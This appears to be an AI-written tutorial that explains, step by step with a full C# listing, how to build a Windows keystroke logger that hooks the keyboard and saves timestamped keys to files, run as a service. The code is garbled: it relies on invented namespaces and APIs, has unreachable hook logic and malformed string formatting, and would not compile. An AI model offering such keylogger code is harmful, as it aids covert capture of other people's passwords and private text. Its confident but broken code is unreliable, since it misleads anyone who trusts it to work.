To create a keystroke logger on a Windows computer, you can use keyboard hooking through the Windows API. Here's a detailed step-by-step guide:

### Step-by-Step Explanation

1. **Import Necessary Libraries**: Use the `System.Windows.Forms` namespace for keyboard hooking.

2. **Define the Keystroke Class**: Create a class to store each keystroke with the key pressed and the timestamp.

3. **Implement the Keyboard Hook**: Use the `SetWindowsHook` function to install a low-level keyboard hook.

4. **Callback Function**: Define a function that triggers on each key press and records the keystroke.

5. **Start and Stop the Hook**: Use a timer to continuously check for key presses and manage the hook's lifecycle.

6. **Save Logs**: Store the keystrokes in a file at regular intervals.

### Code Implementation

```csharp
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;
using User32 = System.Windows.Forms.Universal;
using Kernel32 = System.Windows.Forms;

public class KeystrokeLogger
{
    private static int _hookID = 0;
    private static bool _isHooked;
    private static object _syncRoot = new object();
    private static List<Keystroke> _keystrokes = new List<Keystroke>();
    private static Timer _timer;

    public static void StartLogging()
    {
        lock (_syncRoot)
        {
            if (_isHooked)
                return;

            if (!InstallKeyboardHook())
                return;

            _isHooked = true;
            _timer = new Timer()
            {
                Interval = 100,
                Enabled = true
            };

            _timer.Tick += new EventHandler(Timer_Tick);
            _timer.Start();
        }
    }

    public static void StopLogging()
    {
        lock (_syncRoot)
        {
            if (!_isHooked)
                return;

            UninstallKeyboardHook();
            _isHooked = false;
            _timer.Stop();
            _timer.Dispose();
        }
    }

    private static bool InstallKeyboardHook()
    {
        return RegisterKeyboardHook();
    }

    private static bool RegisterKeyboardHook()
    {
        _hookID = User32.SetWindowsHook(WindowsHookType.WhKeyboard, KeyboardHookCallback);
        return _hookID != 0;
    }

    private static void UninstallKeyboardHook()
    {
        if (_hookID == 0)
            return;

        try
        {
            User32.UnsetWindowsHook(_hookID);
        }
        finally
        {
            _hookID = 0;
        }
    }

    private static void KeyboardHookCallback(int nCode, int wParam, ref bool handled)
    {
        if (!handled)
        {
            handled = true;
            return;

            if (nCode >= 0 && nCode <= 0x1F)
            {
                var key = (Keys)(nCode);
                if ((GetAsyncKeyState(nCode) & 0x1) != 0)
                {
                    KeystrokeLog(key);
                }
            }
        }
    }

    private static void KeystrokeLog(Keys key)
    {
        lock (_syncRoot)
        {
            _keystrokes.Add(new Keystroke { Key = key, Time = DateTime.Now });
        }
    }

    private static void Timer_Tick(object sender, EventArgs e)
    {
        lock (_syncRoot)
        {
            if (_keystrokes.Count > 0)
            {
                var elapsed = DateTime.Now - _keystrokes.First().Time;
                if (elapsed.Minutes > 1)
                {
                    SaveKeystrokes();
                    _keystrokes.Clear();
                }
            }
        }
    }

    private static void SaveKeystrokes()
    {
        var fileName = $"Keystrokes_{DateTime.Now.ToString("HHmmss")}.txt";
        using (var stream = File.Create(fileName))
        {
            foreach (var keystroke in _keystrokes)
            {
                stream.WriteLine($"{keystroke.Key.ToString("Name"), keystroke.Time: HH:mm:ss.fff");
            }
        }
    }

    public static void Main()
    {
        var options = new AutoRunOptions();
        ServiceBase.Run(new ServiceController("KeystrokeLogger", options));
    }
}

public class Keystroke
{
    public Keys Key { get; set; }
    public DateTime Time { get; set; }
}
```

